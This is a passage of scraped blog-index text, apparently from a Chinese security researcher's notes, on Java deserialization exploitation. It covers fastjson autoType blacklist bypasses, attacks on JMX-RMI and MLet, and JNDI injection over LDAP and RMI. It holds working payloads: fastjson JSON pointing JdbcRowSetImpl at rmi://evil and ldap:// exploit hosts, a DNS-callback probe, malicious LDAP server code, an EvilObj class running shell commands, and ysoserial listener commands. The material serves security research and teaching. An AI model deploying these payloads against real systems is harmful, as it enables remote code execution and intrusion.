templatesimpl参考：http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ 根据前面的分析，我们需要找到可以利用的构造函数、setter或getter函数。在分析Commons-Collections系统的利用链时，提到过templatesimpl的执行方式，通过载入bytecodes的方式来达到任意代码执行的效果(具体不再分析)。 其中触发载入的函数为newTransformer函数，而很巧的是，templatesimpl存在一个getter调用了该函数 那么很明显，我们可以直接填入outputProperties的方法来触发getOutputProperties（他恰巧无setter，返回值也符合条件）。但是有一个问题是我们需要填充的类属性都是private类型，要想执行该利用链，需要在调用parseObject函数时填入Feature.SupportNonPublicField。以下图为例，将调用计算器 1234String jsonString = \"&#123;\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\" + \"\\\"_name\\\":\\\"goodjob\\\",\\\"_tfactory\\\":&#123;&#125;,\" + \"\\\"_bytecodes\\\":[\\\"yv66vgAAADQAOgoAA...\\\"],\" + \"\\\"_outputProperties\\\":null&#125;\"; 这里的bytecodes可以用ysoserial工具来生成。在构造payload的时候，需要注意的是_tfactory必须填上，因为在执行过程中，如果它为null，会报错无法进入载入bytecodes的步骤。非常好的是，我们只要填上_tfactory:{}，fastjson会自动帮我们调用TransformerFactoryImpl（tfactory的类）的无参构造函数进行实例化。`\\`在smartMatch函数被替换为空。 除此之外，byte[]类型在fastjson转化中会被base64编码 所以payload中是一长串base64的字串。 可以看到这个poc其实限制还是挺大的，需要fastjson parseObject时填上Feature.SupportNonPublicField才可以。 (2). 基于JNDI的利用我们都知道如果JNDI的lookup函数参数值可控，那么我们可以利用JNDI Reference的方法加载远程代码达成RCE利用。所以根据前面的分析，如果我们可以在无参构造函数、符合条件的setter、符合条件的getter里发现一个可控的lookup函数，我们就可以利用JNDI的注入方法来达成利用。 JdbcRowSetImplJdbcRowSetImpl对象可以被我们用做上述的利用，来看一下他的代码 这次出问题的地方在于setAutoCommit函数，该函数调用了connect函数来重新发起一个jdbc的连接 在connect函数里我们可以看到调用了lookup函数，其参数值由getDataSourceName来获取，该函数主要返回属性dataSource，根据fastjson的利用原理，我们只需要填充dataSource和autoCommit就可以触发这里的JNDI注入。 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil:1099/test\",\"autoCommit\":true&#125; 还有很多其他的可以用来JNDI注入的对象，比如org.hibernate.jmx.StatisticsService的setSessionFactoryJNDIName函数，原理一样不再叙述。 (3). Tomcat dbcp BasicDataSource同1中的TemplateImpl，BasicDataSource也可以载入任意的对象来执行任意代码。先来讲一下他的原理 前面的基础知识里提到了我们可以调用符合条件的getters，在BasicDataSource存在一个getConnection函数，他主要调用createConnectionFactory 在createConnectionFactory函数使用Class.forName加载类 这部分driverClassName和driverClassLoader是可控的，这时候我们要用到的是com.sun.org.apache.bcel.internal.util.ClassLoader，这个ClassLoader可以从classname中提取出BCEL格式的class字节码，并调用defineClass进行载入 这里我们可以写一个用了静态块的类来执行代码。 0x03 Fastjson历史版本修复措施 这一部分主要讲述几个重要版本的安全更新 (1). fastjson == 1.2.25默认关闭AutoType，需要手动开启@type的支持，见enable_autotype com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) 当遇到@type时，会先com.alibaba.fastjson.parser.ParserConfig#checkAutoType。该函数的一个主要逻辑（1.2.25版本） 开启了AutoType时，会过一次黑名单和白名单检测（先检测白名单，后检测黑名单）。 优先载入人工配置的白名单类，并对黑名单类爆出异常； 这里先忽略未开启AutoType时的检测处理 前面的情况都不符合，并且开启了AutoType，则尝试去载入任意类，但是不可以载入ClassLoader和DataSource的子类 这里载入的方法用的都是TypeUtils.loadClass，来看一下他的一个处理 首先他对于Lxxx.class.xxx;的类表示方法做L,;的剔除，递归调用loadClass去调用内部的具体类 后续的调用方法为使用AppClassLoader.loadClass或Class.forName去加载类 开启AutoType的情况下绕过黑名单检测根据上面的分析，如果开启了AutoType，那么如果是在白名单里的类，直接加载，对于在黑名单内的类直接抛出异常。 而黑名单的检测方式是去匹配当前的类名class.startsWith(deny) 而在这个黑名单里显然并没有考虑到TypeUtils.loadClass实现中，对于Lxxxx.class.xxx;的处理。 通过Lxxxxx;的方式startsWith没办法正常匹配出来，所以我们可以绕过黑名单的检测。 (2). fastjson == 1.2.42在这个版本，对上面的黑名单检测绕过做了修复，并且将黑名单里的类型进行hash处理，增加了分析难度； 对于前面Lxxxxx;的绕过，42版本添加了以下代码来剔除（因为黑名单已经变成了hash比较的方式，这里L;都以这种方式来确认） 但是这里的处理治标不治本，我们使用LLxxxxx;;这种方式就可以绕过。 除此之外，由于现在的黑名单变成了hash计算的方式，给我们分析增加了不少难度，不过有大佬对黑名单hash做了还原见fastjson-blacklist (3). fastjson == 1.2.43这个版本主要修复了上面LLxxxx;;的方式 做了两次检测，如果碰上LLxxxxx;;的方式则直接爆出异常 (4). fastjson == 1.2.48修复前的版本在48版本之前，checkAutoType还存在这样一个逻辑（以1.2.47为例） 当开启AutoType时，如果mappings里面存在这个类，那么就算这个类在黑名单里，也允许他进行下一步操作 PS：这里的mappings是fastjson提早载入的一些缓存类 后续如果能从mappings里面得到这个类，就直接返回。那么我们有没有什么方法将我们需要的类加入到这个mappings里呢？ 先来看一下deserializers.findClass，在deserializers里面预先填充了一些类与其反序列化器的实例 这里我们主要关注一下Class.class，他所对应的反序列化器为MiscCodec，checkAutoType检测过后，后续将调用反序列化器的deserialze函数。来看看MiscCodec的这个函数对于Class.class的处理 他调用了TypeUtils.loadClass函数，前面我们讲过，他将使用ClassLoader.loadClass或Class.forName来载入类，在这一过程中，涉及到了mappings的操作 这里的cache默认为true，所以这里会直接将载入后的对象填入mappings 根据我们前面的分析，如果当前mappings里存在可控的类，那么不管开没开启AutoType，都会进行类还原；同时我们利用Class.class可以向mappings填充任意类，这导致绕过了前面的检测； 12345678// 举个例子json = \"&#123;\" + // 用Class载入com.sun.rowset.JdbcRowSetImpl，并缓存到mappings \"&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + // 后续使用mappings里的com.sun.rowset.JdbcRowSetImpl来还原对象 \"&#123;\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\" + \"\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\" + \"\\\"autoCommit\\\": true&#125;\" + \"&#125;\"; 修复后的版本在1.2.48版本上对其进行了修复 在MiscCodec对Class的处理中，修改了cache=false 并且对于TypeUtils.loadClass里的mappings操作都依赖于cache，如果为false则不添加到mappings里（在前面的版本里Class.forName部分并不依赖cache，48版本之后增加了对cache的判断） 与此同时，java.lang.Class也被加入到了黑名单里面 (5). 后续版本后续版本的绕过主要围绕在： 开启AutoType，绕过黑名单检测 利用deserializers里面的类(跟Class.class一个原理) 最新版1.2.68引入了safeMode，在checkAutoType里添加了下面判断，如果开启了safemode，那么将不允许进行@type 不过这个并不是默认开启的，需要人工去配置。 (6). 后续版本觉得有意思的利用 fastjson &lt; 1.2.60 dos Fastjson-1-2-60-Dos 使用dnslog来检测fastjson漏洞 https://github.com/alibaba/fastjson/issues/3077 这里的原理跟Class.class是一样的，只是换成了java.net.URL、java.net.Inet4Address、java.net.Inet6Address，由MiscCodec处理时会去触发dns查询 当然这里的触发URL的触发用的ysoserial里面的URLDNS的方式，由hashcode去触发； 123&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125; 0x04 总结 到这里fastjson相关的知识点就梳理结束了，这其中开发者与安全研究人员的攻防交互真是令人称快！后续如果有其他的绕过，还会继续写下去。 总结一下fastjson利用中的特色： 反序列化时主动触发符合条件的setters和getters，其中使用parse和parseObject函数，在getter利用上parseObject的限制更低一点；但是这里我们可以利用本文的两种方法将parse的调用效果转化为parseObject com.sun.org.apache.bcel.internal.util.ClassLoader是个好东西 fastjson的黑名单绕过来看，基本上找的都是jndi相关的利用，或许可以扩展一些其他的？ 有时候开发者理解不到位，打得补丁可以轻松被绕过，所以需要紧盯补丁的情况"},{"title":"【notes】攻击Java JMX-RMI","permalink":"http://blog.0kami.cn/2020/03/10/java/java-jmx-rmi/","text":"0x00 前言RMI的一个重要应用是JMX(Java Management Extentions)，本文介绍JMX的两个攻击面：） 0x01 基础在写一半的时候，发现了这篇文章，感觉写的很好，可以看看：https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/ JMX Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks. MBean JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods. The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must: Implement an interface Provide a default constructor (without any arguments) Follow certain naming conventions, for example implement getter/setter methods to read/write attributes 这里提一下，当MBean的名字为Hello时，其相应的interface名必须为HelloMBean，不然算不合法的MBean MBean Server A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components. DEMO用参考里的，用jconsole看看结果 在JConsole里可以对当前注册的MBean进行操作，如上图调用sayHello函数 当前我们连的是本地的MBean Server(每个java进程在本地都会有一个MBean Server)，我们也可以将MBean Server挂载到某一端口上，提供远程的MBean管理。 运行jar时带上-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false 直接通过JConsole来连接，会提示你有两种方法1:host:port;2:service:jmx:&lt;protocol&gt;:&lt;sap&gt; 这里我们重点要讲的就是第二种方法，首先我们先来看一下jmx建立起2222端口后，用nmap来获取其内容是怎么样的 从结果来看，JMX的MBean Server是建立在RMI的基础上的，并且其RMI Registy注册的名字叫jmxrmi。 第二种方法中，我们可以通过指定具体的协议来跟Server端进行连接，参考JMX RMI connector API There are two forms for RMI connector addresses: In the JNDI form, the URL indicates where to find an RMI stub for the connector. This RMI stub is a Java object of type RMIServer that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by JNDI, typically the RMI registry, LDAP, or COS Naming. In the encoded form, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object. 这里的encoded form的反序列化过程实在发起端进行的，所以这里不考虑第二种形式。 对于JNDI的形式，有以下几种方法跟JMX Server去连接： Connector支持JRMP和iiop作为连接层的协议，所以对应的有两种方式 121. service:jmx:rmi://host:port/2. service:jmx:iiop://host:port/ 此外，还有基于目录条目的connectors 12341. service:jmx:rmi://host:port/jndi/jndi-name2. service:jmx:iiop://host:port/jndi/jndi-name比如serivce:jmx:rmi://&lt;可忽略的host&gt;/jndi/rmi://host:port/jmxrmi 这种方式就可以使用jndi下的所有spi来进行连接 0x02 攻击JMX1. 攻击JMX-RMICVE-2016-3427 由于JMX认证时传递的是HashMap数据结构，而以HashMap可以直接构造一个反序列化利用链来攻击本地ClassPath，这里已经修复了不细讲了XD 主动攻击1：利用RMI Registy收到远程bind时产生的反序列化漏洞 jdk&lt;8u141_b10(并且check host的顺序变了，详细可以看这里)，8u141_b10修改后SingleEntryRegistry增加了filter 限制了接受到的不能是序列化后的对象，也就意味着不能利用registry这种方式来达成利用了。 主动攻击2:利用RMI DGC实现存在反序列化漏洞，可在JEP 290之前的版本攻击成功(使用ysoserial的JRMPClient，分析也见这里0x08部分) 前面两种方式，在最新版的JDK8中均早已失效。除了直接攻击RMI层，我们也还可以利用MBean Server挂载的对象函数，来传递构造好的序列化数据。这里有点像RMI中利用RMI Server挂载的对象函数参数中存在相关可利用的对象，如Object类型就可以装载所有的序列化数据。 2. 攻击存在函数参数的对象利用MBean Server挂载的对象函数参数，来传递构造好的序列化数据。MBean Server接收到数据后，会对获取到的参数数据进行object[]转换，在转换前，需要将RMI交互过程中的序列化数据进行反序列化 javax/management/remote/rmi/RMIConnectionImpl.java#unwrap 1583行进行类型转化，但首先需要先进行反序列化mo.get() java/rmi/MarshalledObject.java#get 这里就到了常规的反序列化操作 所以只要MBean Server里存在MBean的函数存在参数，我们通过构造相关的invoke传递过去就可以触发反序列化 如java.util.logging.Logging#getLoggerLevel(String)有一个String类型的函数参数，这里我们直接将payload塞进invoke的第二个参数即可。 其他的MBean也同样可以这样操作，这里如果需要认证的话，就需要在连接时将认证信息带上，后续的还是可以利用成功的。 3. 利用MLET方式动态加载MBean这里先说利用方式： 利用条件： 无security manager 无认证 利用原理： 在一HTTP Server挂载mlet文件和包含MBean的jar文件 用createMBean(&quot;javax.management.loading.MLet&quot;, null);的方式在远程JMX创建MLet对象 使用getMBeansFromURL从远程HTTP Server加载mlet文件 解析mlet文件，由于存在codebase，从远程加载jar文件，并载入该MBean 调用该MBean的方法，这个方法可以是自定义的执行命令等操作 简单分析： 来简单说一下MLet的原理，JMX除了加载本地的MBean，也可以加载远程的MLet文件(包含了MLet标签)来动态加载codebase里的Jar文件。后者就是通过MLet对象的getMBeansFromURL函数来完成的。 有兴趣的可以翻一翻javax/management/loading/MLet.java#getMBeansFromURL，这里直接说一下流程 从远程服务器加载MLet文件并解析该文件 根据MLet文件中指定的codebase和archive字段，拼接成最后要请求的jar文件URL地址 最后由URLClassLoader来完成请求载入操作 这里需要注意的是，第2步中，如果当前的URL地址已经存在将不再重新发起载入请求，意味着一次载入成功之后，我们就可以直接调用该MBean（Server不重启的状态下）。 而对于前面提到的两个利用条件： 在文档里https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html提到 Caution - This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a javax.management.loading.MLet MBean and use it to create new MBeans from arbitrary URLs, at least if there is no security manager. In other words, a rogue remote client could make your Java application execute arbitrary code. Consequently, while disabling security might be acceptable for development, it is strongly recommended that you do not disable security for production systems. 首先对于有认证的情况下，调用MLet将会进行权当前用户的权限验证，默认情况下都是不允许的。 com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccess会检查当前登陆的用户是否有Create的权限(这里的权限是下面的createPatterns，它允许创建指定正则的类型，而我们默认是为空的)，这里默认会返回false，也就意味着它不允许以MLet对象创建新的MBean 其次对于security manager的限制，在远程载入前会判断是否存在载入的权限（这里我没看到其他的地方做了判断，可能不止当前这个位置的验证） 当前方法比较方便的是可以载入任意的代码来执行，但是利用条件比较苛刻。 0x03 总结对于JMX的利用主要利用的是本地存在的Gadget，如果本地不存在Gadget的话就无法利用成功。除非满足JMX MLet的利用条件，通过加载codebase上的Jar文件来执行任意代码。 除此之外，由于本身JMX用的RMI那一套东西，所以如果在合适的JDK版本下，我们可以直接攻击RMI，不过前提仍然是本地存在相关的利用链。 最后，前文提到的攻击方法我已经同步到github上了"},{"title":"【notes】JNDI with LDAP","permalink":"http://blog.0kami.cn/2020/03/01/java/jndi-with-ldap/","text":"0x00 前言JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager，本文将讲述JNDI使用ldap协议的两个攻击面XD 0x01 LDAP基础关于LDAP的介绍，延伸阅读一下这篇 LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory: ● Using Java serialization o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html● Using JNDI References o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html from https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf Java中的LDAP可以在属性值中存储相关的Java对象，可以存储如上两种对象，而相关的问题就是出现在这部分上。 后文用的LDAP Server参考的是mbechler 实现的LDAPRefServer，连接的客户端Client直接用JNDI的lookup完成，jdk版本jdk8u162 123Context ctx = new InitialContext();ctx.lookup(\"ldap://127.0.0.1:1389/EvilObj\");ctx.close(); 0x02 LDAP with JDNI ReferencesJNDI发起ldap的lookup后，将有如下的调用流程，这里我们直接来关注，获得远程LDAP Server的Entry之后，Client这边是怎么做处理的 跟进com/sun/jndi/ldap/Obj.java#decodeObject，按照该函数的注释来看，其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象，也可能是一个Reference对象。关于序列化对象的处理，我们看后面一节。这里摘取了Reference的处理方式： 1234567891011121314static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; // ... attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// \"objectClass\" if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // \"javaNamingReference\" attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; // \"javanamingreference\" return decodeReference(attrs, codebases); &#125; //... 如果LDAP Server返回的属性里包括了objectClass和javaNamingReference，将进入Reference的处理函数decodeReference上 12345678910111213if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) &#123; className = (String)attr.get();&#125; else &#123; throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] + \" attribute is required\");&#125;if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) &#123; factory = (String)attr.get();&#125;Reference ref = new Reference(className, factory, (codebases != null? codebases[0] : null)); decodeReference再从属性中提取出javaClassName和javaFactory，最后将生成一个Reference。这里如果看过我前面的那篇jndi-with-rmi，可以看到其实这里生成的ref就是我们在RMI返回的那个ReferenceWrapper，后面这个ref将会传递给Naming Manager去处理，包括从codebase中获取class文件并载入。 而这里LDAP也类似，处理ref的对象是NamingManager的子类javax/naming/spi/DirectoryManager.java，因为跟RMI有点类似不具体分析了，最后同样由javax/naming/spi/NamingManager.java#getObjectFactoryFromReference来处理。 到这里，我们再来看mbechler 实现的LDAPRefServer就比较清楚了 当其获取到LDAP连接时，将填充如上的几个属性及其对应的值，就是为了满足上面的条件而生成一个Reference对象。 0x03 LDAP with Serialized ObjectJNDI对于属性中的序列化数据的处理一共有两个地方，我们先来顺着前面的JNDI Reference的思路说下去 第一处：com/sun/jndi/ldap/Obj.java#decodeObject在com/sun/jndi/ldap/Obj.java#decodeObject上还存在一个判断 1234if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123;// “javaSerializedData” ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl);&#125; 如果在返回的属性中存在javaSerializedData，将继续调用deserializeObject函数，该函数主要就是调用常规的反序列化方式readObject对序列化数据进行还原，如下payload。 12345@Overrideprotected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaSerializedData\", serialized);&#125; 这里我们就不需要通过远程codebase的方式来达成RCE，当然首先本地环境上需要有反序列化利用链所依赖的库文件。 第二处：com/sun/jndi/ldap/Obj.java#decodeReferencedecodeReference函数在对普通的Reference还原的基础上，还可以进一步对RefAddress做还原处理，其中还原过程中，也调用了deserializeObject函数，这意味着我们通过满足RefAddress的方式，也可以达到上面第一种的效果。 具体代码太长了，这里我就说一下条件： 第一个字符为分隔符 第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型 第二个分隔符与第三个分隔符之间，表示type，类型 第三个分隔符是双分隔符的形式，则进入反序列化的操作 序列化数据用base64编码 满足上面的条件，构造一个类似的 12345protected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serialized)); entry.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$&#125; 当然第二处只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。 0x04 后续自jdk8u191-b02版本后，新添加了com.sun.jndi.ldap.object.trustURLCodebase默认为false的限制，也就意味着远程codebase的Reference方式被限制死了，我们只能通过SerializedData的方法来达成利用。 我们来整理一下，关于jndi的相关安全更新 JDK 6u132, JDK 7u122, JDK 8u113中添加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false。 导致jndi的rmi reference方式失效，但ldap的reference方式仍然可行 Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。 导致jndi的ldap reference方式失效，到这里为止，远程codebase的方式基本失效，除非认为设为true 而在最新版的jdk8u上，jndi ldap的本地反序列化利用链1和2的方式仍然未失效，jndi rmi底层(JRMPListener)StreamRemoteCall的本地利用方式仍未失效。 所以如果Reference的方式不行的时候，可以试试利用本地ClassPath里的反序列化利用链来达成RCE。 0x05 总结JNDI和LDAP的结合，出现了2种利用方式，一是利用远程codebase的方式，二是利用本地ClassPath里的反序列化利用链。在最新版的jdk8u中，codebase的方式依赖com.sun.jndi.ldap.object.trustURLCodebase的值，而第二种方式仍未失效。 LDAP的使用方法除了JNDI的lookup，其他的库也会有相应的使用方法，如Spring的ldap，这里还可以继续深入下去，先挖个坑XD 最后，上面的两个ldap Server更新到了github上，自取XD"},{"title":"【notes】JNDI with RMI","permalink":"http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/","text":"0x00 前言在现实环境中，遇到RMI Registry的机会很少，而结合反序列化漏洞的JNDI注入则常见了许多。本文将介绍RMI结合JNDI后可以做哪些事情XD 0x01 基础在看JNDI同RMI的利用前，我们先来看看关于RMI动态类加载的概念。 RMI动态类加载RMI有一个重要的特性是动态类加载机制，当本地CLASSPATH中无法找到相应的类时，会在指定的codebase里加载class。codebase可以在系统属性java.rmi.server.codebase设置其URL。如果codebase的URL可控，那么我们就可以载入任意的class或jar文件。根据P牛的Java安全漫谈- RMI篇中提到，通过修改传递过程中的序列化数据，将其中的codebase修改为恶意的server，这样可以达到RMI Server端被攻击的效果。不过，这个利用条件比较苛刻，并且oracle在后面对其做了限制，如果要成功利用需要满足如下要求： 安装并配置了SecurityManager Java版本低于7u21，6u45或者设置了java.rmi.server.useCodebaseonly=false 摘自Java安全漫谈-RMI篇 其中上面的配置，在7u21，6u45后的版本里默认为true，那么也就无法从远程codebase中载入类，避免了上面说的这种攻击的可能性。 JNDI的相关概念 Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf JNDI方便了与naming service和Directory service的交互，通过指定特定的URL即可与不同的服务进行交互。相当于对这些服务的API又进行了一次封装供开发人员使用。其中JNDI中也存在上述RMI codebase的动态加载机制，并且其配置同底层的RMI配置并不相关。 从上述的构架来看，动态加载发生于两个部分，Naming Manager和JNDI SPI。这里SPI部分就是相对应的服务的配置，比如前文提到的RMI的限制就是SPI部分的。而Naming Manager也存在一个动态加载机制并且其在修复前并无限制，这里Naming Manager部分用到的是JNDI的Naming References In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 这里提到由于某些情况不能直接将远程obj返回，所以JNDI提出了Naming References的方法，返回相应的Reference而不返回具体的obj。统一由JNDI的请求端去加载指定的地址上的obj。这里加载方法中就包括远程codebase的方法，来看个例子 1234String FactoryURL = \"http://some-evil-server\";Reference reference = new Reference(\"MyClass\",\"MyClass\",FactoryURL);ReferenceWrapper wrapper = new ReferenceWrapper(reference);ctx.bind(\"Foo\", wrapper);// 绑定reference 请求端以lookup请求上述绑定的RMI服务即可。其处理过程引用https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 0x02 原理JNDI with RMI DEMO为了更好的说明，以下面的代码为例 1234567891011121314151617181920212223package train.jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * @author wh1t3P1g * @since 2020/2/4 */public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); String FactoryURL = \"http://localhost/\"; Reference reference = new Reference(\"EvilObj\",\"EvilObj\",FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"Foo\", wrapper); &#125;&#125; Server端以RMI Registry注册一个Reference，并将factoryURL指定为localhost 123456789101112131415package train.jndi;import javax.naming.Context;import javax.naming.InitialContext;/** * @author wh1t3P1g * @since 2020/2/4 */public class Client &#123; public static void main(String[] args) throws Exception &#123; Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:1099/Foo\"); &#125;&#125; Client端比较简单，直接以lookup指定的RMI URL即可。根据上面的过程图，我们可以知道的是最终执行EvilObj的地方是Client端(jndi发起lookup的方法)。最后我们创一个EvilObj 123456789101112/** * @author wh1t3P1g * @since 2020/2/4 */public class EvilObj &#123; public EvilObj() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"/bin/sh\", \"-c\", \"open /System/Applications/Calculator.app\"&#125;; rt.exec(commands); &#125;&#125; javac EvilObj.java生成EvilObj.class，然后挂载到一个web服务上就可以了。可以直接选择python来挂载 那么我们来具体看一下lookup函数具体做了什么 首先InitialContext的lookup函数，会根据提供的URL自动选择合适的InitialContext（分离出协议后进行选择），比如此时的InitialContext为rmiURLContext 继续跟进com/sun/jndi/toolkit/url/GenericURLContext.java#lookup 这里的ctx为RegistryContext，将对指定的RMI Registry获取绑定的obj 获取到远程对象，并调用decodeObject函数 如果当前的remote对象是RemoteReference类型，则进一步请求Registry获取该Reference的内容。到这里为止，我们接下来的请求就同Server端的关系不大了，Client会根据拿到的Reference请求相应的服务器 继续跟进getObjectInstance 这里会继续调用NamingManager的getObjectFactoryFromReference，该函数完成了向FactoryURL请求具体的class文件的功能。 这里可以看到，根据factoryName和codebase将远程载入相应的class文件(这里的loadClass用的URLClassLoader来完成任务) 并在第163行对载入的obj进行初始化，这也就是为什么我们需要把payload写在构造函数里。 在利用中，lookup函数的参数必须是可控的，或者利用反序列化利用链的方式来完成，比如下面的两个案例 案例一：Spring框架的JtaTransactionManager类16年的时候Spring框架暴了一个反序列化的可利用点JtaTransactionManager，其原理就是利用了JNDI 可控的lookup参数（这里的可控由反序列化来完成）。来看一下原理 org/springframework/transaction/jta/JtaTransactionManager.java#readObject 这里1230行初始化了一个jdni的context，这个context将用于后续的JNDI lookup 继续跟进initUserTransactionAndTranscationManager 继续跟进lookupUserTransaction 这里最终调用了context的lookup函数，并且其参数为userTransactionName，这个部分我们可以在序列化前进行构造，例如下面的代码(更新在了ysoserial的spring3上) 到了如今2020年，这个类的利用仍然存在于最新版的Spring-tx组件上XD 案例二：FastJSON反序列化POC JdbcRowSetImpl类fastjson由于@type的存在，在受影响的版本中，其可以对任意指定的对象进行反序列化，根据规则自动调用setter/getter来达到实例还原的目的。首先来看一下POC 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\":true&#125; 这里的关键在于autoCommit，来看一下JdbcRowSetImpl的setAutoCommit函数 这里如果conn为null的话，会调用connect函数，看一下connect函数 看到这里用JNDI进行数据库连接，并且由于fastjson的特性dataSource是可控的，这就意味着我们可以控制lookup的参数，并向恶意的server发起JNDI连接。根据前文说的原理，我们可以使得主机执行任意代码。 0x03 环境复现改造JRMPListener由于JNDI底层用的都是RMI的东西，所以我们要建立一个绑定了Reference的RMI服务，可以直接改改JRMPListener。 在RMI部分曾经分析过JRMPListener，其返回了ExceptionalReturn，使得构造好的Exception在Client反序列化执行命令。而对于绑定Reference，我们需要修改ExceptionalReturn为NormalReturn并将payloadObject改为ReferenceWrapper payloadObject改为ReferenceWrapper 但是在实际测试时，发现Client请求后不能完全退出。其实我们也可以直接用上面的例子 不过这里就获取不到是否有访问进来，根据实际的环境取舍吧XD 改造后的已更新到github上 12345678// 开启挂载了evil class文件的HTTP Serverjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj \"open /System/Applications/Calculator.app\"// 开启RMI Reference Listenerjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/// 或者使用RMIRefListener2，集合了上面两个步骤java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj \"open /System/Applications/Calculator.app\" FastJSON 1.2.24 RCE这里我们以FastJSON 